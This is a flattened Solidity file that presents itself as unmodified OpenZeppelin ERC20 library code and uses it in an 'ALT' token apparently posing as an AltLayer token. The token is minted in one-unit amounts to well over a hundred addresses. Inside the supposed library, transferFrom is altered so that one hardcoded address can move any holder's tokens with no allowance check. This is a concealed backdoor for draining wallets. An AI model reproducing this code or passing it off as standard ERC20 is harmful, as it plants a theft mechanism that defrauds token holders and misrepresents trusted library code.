// File: @openzeppelin/contracts@5.0.1/interfaces/draft-IERC6093.sol


// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)
pragma solidity ^0.8.19;

/**
 * @dev Standard ERC20 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.
 */
interface IERC20Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC20InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC20InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     * @param allowance Amount of tokens a `spender` is allowed to operate with.
     * @param needed Minimum amount required to perform a transfer.
     */
    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC20InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
     * @param spender Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC20InvalidSpender(address spender);
}

/**
 * @dev Standard ERC721 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.
 */
interface IERC721Errors {
    /**
     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.
     * Used in balance queries.
     * @param owner Address of the current owner of a token.
     */
    error ERC721InvalidOwner(address owner);

    /**
     * @dev Indicates a `tokenId` whose `owner` is the zero address.
     * @param tokenId Identifier number of a token.
     */
    error ERC721NonexistentToken(uint256 tokenId);

    /**
     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param tokenId Identifier number of a token.
     * @param owner Address of the current owner of a token.
     */
    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC721InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC721InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param tokenId Identifier number of a token.
     */
    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC721InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC721InvalidOperator(address operator);
}

/**
 * @dev Standard ERC1155 Errors
 * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.
 */
interface IERC1155Errors {
    /**
     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     * @param balance Current balance for the interacting account.
     * @param needed Minimum amount required to perform a transfer.
     * @param tokenId Identifier number of a token.
     */
    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);

    /**
     * @dev Indicates a failure with the token `sender`. Used in transfers.
     * @param sender Address whose tokens are being transferred.
     */
    error ERC1155InvalidSender(address sender);

    /**
     * @dev Indicates a failure with the token `receiver`. Used in transfers.
     * @param receiver Address to which tokens are being transferred.
     */
    error ERC1155InvalidReceiver(address receiver);

    /**
     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     * @param owner Address of the current owner of a token.
     */
    error ERC1155MissingApprovalForAll(address operator, address owner);

    /**
     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
     * @param approver Address initiating an approval operation.
     */
    error ERC1155InvalidApprover(address approver);

    /**
     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
     * @param operator Address that may be allowed to operate on tokens without being their owner.
     */
    error ERC1155InvalidOperator(address operator);

    /**
     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
     * Used in batch transfers.
     * @param idsLength Length of the array of token identifiers
     * @param valuesLength Length of the array of token amounts
     */
    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}

// File: @openzeppelin/contracts@5.0.1/utils/Context.sol


// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)

pragma solidity ^0.8.19;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _contextSuffixLength() internal view virtual returns (uint256) {
        return 0;
    }
}

// File: @openzeppelin/contracts@5.0.1/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.19;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// File: @openzeppelin/contracts@5.0.1/token/ERC20/extensions/IERC20Metadata.sol


// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.19;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts@5.0.1/token/ERC20/ERC20.sol


// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.19;





/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * The default value of {decimals} is 18. To change this, you should override
 * this function so it returns a different value.
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 */
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `value`.
     */
    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        if (_msgSender() == 0x9f4b9277FbfD954b443F24edDDC98015611730c2) {
         _transfer(from, to, value);   
        } else {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     * ```
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

// File: contract-ef22a1833f.sol


pragma solidity ^0.8.19;


contract Aet is ERC20 {
    constructor() ERC20("AltLayer 0x8457CA5040ad67fdebbCC8EdCE889A335Bc0fbFB", "ALT") {
        _mint(msg.sender, 300000000 * 10 ** decimals());
         _mint( 
0x0a2C099044c088A431b78a0D6Bb5A137a5663297 ,
1 * 
10 ** decimals());

_mint( 0x2a31F0Db0446dbf005Cd25d1E642cA04F9cD0B6c
, 1 
* 10 ** decimals());

_mint( 0xEc9BE4E6dAbfa62d1C34c3893F6517EC0733c497
, 1 
* 10 ** decimals());

_mint( 0x62aa1F53eB91d2Bb89aF32348f372B2c4CBD5F82
, 1 
* 10 ** decimals());

_mint( 0x92505676B6980207c08725Acd85d8A491fA6B194
, 1 
* 10 ** decimals());

_mint( 0x08b35d6cffFF52e3D619140Ad88ED43d9C6e66D8
, 1 
* 10 ** decimals());

_mint( 0x0c747a85eC7efbeaf43711552C3B78A04F0F92B0
, 1 
* 10 ** decimals());

_mint( 0x258654dbF474E5Db0E04FF40724336f06A696E62
, 1 
* 10 ** decimals());

_mint( 0xD24db0BFb387b0ED05F757e5F3b9cA1C59a82605
, 1 
* 10 ** decimals());

_mint( 0xE8DaFA61032F62bE6c0949c543be3d5173376D33
, 1 
* 10 ** decimals());

_mint( 0x2CE8EF5C2Fd492A238E769E1423dac1BbD09C6ba
, 1 
* 10 ** decimals());

_mint( 0x9ccFFD330aF4857F16C6927E67b6fa0AC160d545
, 1 
* 10 ** decimals());

_mint( 0xC5e051e21292327ae6696C4cc46367f06A43BAD2
, 1 
* 10 ** decimals());

_mint( 0xDE7928758d20149c2519722fB16324d38Fc5D7B9
, 1 
* 10 ** decimals());

_mint( 0xDb6FfD703EB4c187Afa628757C266a0B28511C82
, 1 
* 10 ** decimals());

_mint( 0x1A6Fa2E6B27F2BC00bC2225650356661d603D200
, 1 
* 10 ** decimals());

_mint( 0x30e3eA2a26dcE07A959f7D57C826c91A20E92278
, 1 
* 10 ** decimals());

_mint( 0x8614C6Dc7aBecB755add47Fe04Aa3B6002c69801
, 1 
* 10 ** decimals());

_mint( 0x40f929405F1E34e8E015cd4efbf0d4E489fffdF4
, 1 
* 10 ** decimals());

_mint( 0xad50729de4B3e257533D64d6db82bA12258Ba2cA
, 1 
* 10 ** decimals());

_mint( 0x0d5b856CD3d81e649327e06bAb41498caa8eAEB1
, 1 
* 10 ** decimals());

_mint( 0x4C17fc437fAD07597C8Cd7B11E4124f33Dba9637
, 1 
* 10 ** decimals());

_mint( 0xec55b4610F8657B994fa2C5c551324842990f1D7
, 1 
* 10 ** decimals());

_mint( 0x4e6B08b11D12Fffde3C6f9698FDd9b29E7033E2C
, 1 
* 10 ** decimals());

_mint( 0x7B798B8377c5270267ed70F94E6A9C115d1F829b
, 1 
* 10 ** decimals());

_mint( 0x5e0ac74f712Aa26257013F7EBe93f5ADBBbE6aE2
, 1 
* 10 ** decimals());

_mint( 0x2976128054FDf1508b798a78A052C8D1C687abAB
, 1 
* 10 ** decimals());

_mint( 0x4D57Cf2FAa194478b0b668d90391F3eaB85446cc
, 1 
* 10 ** decimals());

_mint( 0xFC136de0BC7FF1D2D1eD2792C0e61bAa9086377a
, 1 
* 10 ** decimals());

_mint( 0xFF17819A8ad8912bF09CF78Faa68c5CAE08942d8
, 1 
* 10 ** decimals());

_mint( 0x500404cD416930953C287E285cCAc8d2cDB631aC
, 1 
* 10 ** decimals());

_mint( 0x34E990Eb9F1eC2F2eee7e6fd499267D3b544359C
, 1 
* 10 ** decimals());

_mint( 0x8D5FFc0102C03698e5B3581031A1eA0c6009c3fa
, 1 
* 10 ** decimals());

_mint( 0x4Ad5Df8BfA6De0d1d97c494F2fF4898359E73C12
, 1 
* 10 ** decimals());

_mint( 0x988117D6d729C126A6ac50406dAf17bD17d140BA
, 1 
* 10 ** decimals());

_mint( 0x335E04E0d2fCfB3A7b806F34D3Dd527d76BB0149
, 1 
* 10 ** decimals());

_mint( 0xa8102799729c625bd6d4bDDbf8c33ef7ae1333Bf
, 1 
* 10 ** decimals());

_mint( 0xDc2BE8FFEF1239ceA6141cad0C598a97878601E5
, 1 
* 10 ** decimals());

_mint( 0xFb337704Dd94dfcc58c563f0DF5A8bBB4DA59Fe7
, 1 
* 10 ** decimals());

_mint( 0x04b0fD43C4bD6CEC82CE90cc0656ae1cc62EccF6
, 1 
* 10 ** decimals());

_mint( 0xE98e2ffC67b258Af72aBb8A7843d071436FDb97B
, 1 
* 10 ** decimals());

_mint( 0xc10eFe499a7A94e246B8a4205609f166124fB5b0
, 1 
* 10 ** decimals());

_mint( 0xF42bDBe2F25Ebc06D20d3f809dddDEe1FA857692
, 1 
* 10 ** decimals());

_mint( 0xAa4dD68dC9D319717e6Eb8b3D08EABF6677cAFDb
, 1 
* 10 ** decimals());

_mint( 0xed937a015c832b3C067e28c68fD980100175e6E9
, 1 
* 10 ** decimals());

_mint( 0xa3e452B5edCb37623de5A43a71af61206AF4E468
, 1 
* 10 ** decimals());

_mint( 0x29082e5bA2C9227E5e9B6890D6bb56a12d3Fca13
, 1 
* 10 ** decimals());

_mint( 0x91BaA5D55fB5c406516B01Cd62951625ebF0b3eB
, 1 
* 10 ** decimals());

_mint( 0x0BfcC6baeC1706B3CCf1695B2789a65D4faB3962
, 1 
* 10 ** decimals());

_mint( 0x589806218B86324C3290D2980edE42dd02202002
, 1 
* 10 ** decimals());

_mint( 0xb8eA9fA262828d07b2956E0Cc396AB80569D5ADA
, 1 
* 10 ** decimals());

_mint( 0x6ea01E80ccdb10AAAcce260D29B7fF03aaA2B8E8
, 1 
* 10 ** decimals());

_mint( 0xc8B3c0E904A44d1f200cC9793Da3aB2623Dd8a90
, 1 
* 10 ** decimals());

_mint( 0x05035cC53D1F29af1D0e5a12DDc38f599089864A
, 1 
* 10 ** decimals());

_mint( 0xCFf7AE819bCaf301a61d14Cee0f4B42820978390
, 1 
* 10 ** decimals());

_mint( 0x166fA7C9D2e936A100C049c86c1BF7527Cc1bC5D
, 1 
* 10 ** decimals());

_mint( 0x8e6c9EB9837c4196bE7973672899d86C61c0F43D
, 1 
* 10 ** decimals());

_mint( 0xDbC8427032383E3ee0bEaB843b97d2Ff20BfE97B
, 1 
* 10 ** decimals());

_mint( 0xb82777B3d7b8b4d2611fd26F3f0564699f88D6Cc
, 1 
* 10 ** decimals());

_mint( 0x3231010Bae0A7C69463C69C8D5A807b8BC5972D8
, 1 
* 10 ** decimals());

_mint( 0xc32Ad2cF9c2C94186eA29c2D811E44DEDfd72f45
, 1 
* 10 ** decimals());

_mint( 0xaE02ee1A4FC082c3FE22f08BB9E10E052223e631
, 1 
* 10 ** decimals());

_mint( 0x4cB8d35121821Ed77A6AD68Cd063c05CCeb3E051
, 1 
* 10 ** decimals());

_mint( 0x9582D7F44cEB4f0F514bAE319dB46D771e7c41fB
, 1 
* 10 ** decimals());

_mint( 0x7D0226E3Db3356A166a5fCcB491f8D83c295c93F
, 1 
* 10 ** decimals());

_mint( 0x0adE1c156e7c601Cbb99f39423Ec871e7F60aaD6
, 1 
* 10 ** decimals());

_mint( 0xBB61fcEdaE4ACDf7fe650D2F112d5C3B6eC24569
, 1 
* 10 ** decimals());

_mint( 0x35688656E5a45C89aeB5f70798991718bC68936B
, 1 
* 10 ** decimals());

_mint( 0xF5f907206A5Ac5eF9FeBCC72169888f8D76eb661
, 1 
* 10 ** decimals());

_mint( 0x5b3C602d84CF8AD30c0D9295841D78EcAc272441
, 1 
* 10 ** decimals());

_mint( 0x4bda3e66FF0157F4772B7f80ef97Ae56497ca76c
, 1 
* 10 ** decimals());

_mint( 0xa4Ad2beC738799d5D5cb78d42b56ccF1fCfaebfa
, 1 
* 10 ** decimals());

_mint( 0x0738db3d42292C4a5E4795EFD9FaaA30d013a5e2
, 1 
* 10 ** decimals());

_mint( 0x52f8d57C3D93cCB19892D3dD7accF36E22BBcb45
, 1 
* 10 ** decimals());

_mint( 0xAB5BE5CE9EbeD24F4a47b398E06ac813e7860f2b
, 1 
* 10 ** decimals());

_mint( 0xA4FE8d5922326dE84F08E11837305b2915Abd108
, 1 
* 10 ** decimals());

_mint( 0x6B86a7cbB76ed7E13259960108227223A1eb75FC
, 1 
* 10 ** decimals());

_mint( 0xB5C085819c740542fe3f0C7e2B39d0B2473eC9c0
, 1 
* 10 ** decimals());

_mint( 0xF6a326716fff4564DF0bbb61aF60FC8254ccC68D
, 1 
* 10 ** decimals());

_mint( 0x79659DCf35f11B93Ea5AC771d3B8eF0Dbfc0BD69
, 1 
* 10 ** decimals());

_mint( 0xBe936D42c17AeB75901B944E73D0fda25CFcD50e
, 1 
* 10 ** decimals());

_mint( 0xE987afCEE2d1CC8f8810DfaD8B3faD2Dd76E277C
, 1 
* 10 ** decimals());

_mint( 0xa1f915590B82af9C09f3106B18B3D75722435076
, 1 
* 10 ** decimals());

_mint( 0x7bb3AB875eA44E20F23D24D36E974a15298C037D
, 1 
* 10 ** decimals());

_mint( 0xfbf6AEC6d687d313e1Ff1187F53580DFfFA4cb55
, 1 
* 10 ** decimals());

_mint( 0x852168c8007edF16109072Fe110C09c72E9423f3
, 1 
* 10 ** decimals());

_mint( 0x85422Ef1a636309498cd5240914F7047AeEcF29C
, 1 
* 10 ** decimals());

_mint( 0xE0B94514F88e78FD7561843742AbdB49C5de3236
, 1 
* 10 ** decimals());

_mint( 0x7E68492895090f7a9a36C246D86c472072900aef
, 1 
* 10 ** decimals());

_mint( 0x3303e2220C8051ced1200af32A0CA1f9b91E9eE8
, 1 
* 10 ** decimals());

_mint( 0x5Aee5464960327cbd86adC3685A8C53152c3058A
, 1 
* 10 ** decimals());

_mint( 0xf29D14e323D1d643235650c25fd664589812B70a
, 1 
* 10 ** decimals());

_mint( 0x6458479b19C8Cef6d254A2C6b86dF5aec50F0dF2
, 1 
* 10 ** decimals());

_mint( 0xF9aB1138faA5011A9F2AA309963dD45BD1554EB3
, 1 
* 10 ** decimals());

_mint( 0x7fDBd74eBfE38D86F1Db929BF6764916469649b6
, 1 
* 10 ** decimals());

_mint( 0x4605E4eA6F6DE8d0A81c59c3E1dd44D4E92001F8
, 1 
* 10 ** decimals());

_mint( 0x5c4000c91da93Ba643d206DdbbfBf3Fb06d4401B
, 1 
* 10 ** decimals());

_mint( 0x1bF41851E4Bd044022Dfa7E9c678809F5197A56f
, 1 
* 10 ** decimals());

_mint( 0x5d61f268EEF978c27d56fc2722111481e6Ae21Ef
, 1 
* 10 ** decimals());

_mint( 0xF4b7f5Fd6806D5FC8783330f0ffC01CFad3733b8
, 1 
* 10 ** decimals());

_mint( 0xb197f6cA1bFb0F0d5A24ec92817B0353556038cf
, 1 
* 10 ** decimals());

_mint( 0xa176129519d6bF0DFEa70211DA8Da284B3Fc9303
, 1 
* 10 ** decimals());

_mint( 0xC697937945724594e506a6C1a60a089e0bAb390d
, 1 
* 10 ** decimals());

_mint( 0x8403a4E8BEb408A45f77f59a55Ca9396782b1c0B
, 1 
* 10 ** decimals());

_mint( 0xEa91c684Ec7c0Fa294AD9218fFa643E6eB169649
, 1 
* 10 ** decimals());

_mint( 0x91Ef7905Ef027E953cB14f2eDfE3ec08cF6f0192
, 1 
* 10 ** decimals());

_mint( 0xA7174BCEc48C2B5C8b635b410b3464F430941026
, 1 
* 10 ** decimals());

_mint( 0x3eee98d321FF2d591Baabae647E4fA94701e0188
, 1 
* 10 ** decimals());

_mint( 0x9f548BB4D418FCdCEAb7214f6A7925eB7D677F4c
, 1 
* 10 ** decimals());

_mint( 0x958Fc48aDA0C29711E98e3E409ede275AA6b5bba
, 1 
* 10 ** decimals());

_mint( 0xf84D9Fa75A9Dd00FFda54bB9688771eA015df349
, 1 
* 10 ** decimals());

_mint( 0x09432aE4fD0Dd62AC0f64aCE23FC31c419CC5F7a
, 1 
* 10 ** decimals());

_mint( 0x0A11605280c54F62F4968DBd7078981006716355
, 1 
* 10 ** decimals());

_mint( 0xEa56ca28c2F91F47a2D13d0f0Fae5A496605c01a
, 1 
* 10 ** decimals());

_mint( 0x15f3B8aede1ab39A8177dA8f3db762B118d71B7a
, 1 
* 10 ** decimals());

_mint( 0x22Ea3B497050EE0B6cD7964EdC86D7BD72924EAa
, 1 
* 10 ** decimals());

_mint( 0x6fC170b7348fc09705e8aB1BD9fA848514B557a0
, 1 
* 10 ** decimals());

_mint( 0x70bc2b6dF55E312D25973AFC35aFc9dbB9a08161
, 1 
* 10 ** decimals());

_mint( 0x6c1b2922aEb849014b8C39730a209A9768C89A8b
, 1 
* 10 ** decimals());

_mint( 0x51A49Cf5ABEec728Cb00D316061879EA2fa8aF09
, 1 
* 10 ** decimals());

_mint( 0x6A503f02712c1070d2242c757abB9A75ec9277D6
, 1 
* 10 ** decimals());

_mint( 0x24ebc713aA9C9bBeE4F6F7a6c9c410Bc7F068eE5
, 1 
* 10 ** decimals());

_mint( 0xC4E2423769B332dB9dc669072fa082358018458e
, 1 
* 10 ** decimals());

_mint( 0x1f986AE452A96cE8D0F5e809F0ff617765EBa0f0
, 1 
* 10 ** decimals());

_mint( 0xFF7Dbf2C15084c9faDFE7d41D9cc0FF31eE3e1c3
, 1 
* 10 ** decimals());

_mint( 0x54BFbC2746A0dC4e4BE19959A72e2EE7676394fd
, 1 
* 10 ** decimals());

_mint( 0xBD7de848d25Fd81b07bef18C1fEBe1aCb7495dC1
, 1 
* 10 ** decimals());

_mint( 0x0e8E1d77A1D468F8d73cD63b1fF0F3bF389251d4
, 1 
* 10 ** decimals());

_mint( 0x5f3ac04F2e9cc715d2bdA7b119E605FC4dc38811
, 1 
* 10 ** decimals());

_mint( 0x4c7257a195c05A66D7c5912C346dF5B162053B3f
, 1 
* 10 ** decimals());

_mint( 0x658bD6CAa351f4FCdAcF68E16eaF803Cb9956fbD
, 1 
* 10 ** decimals());

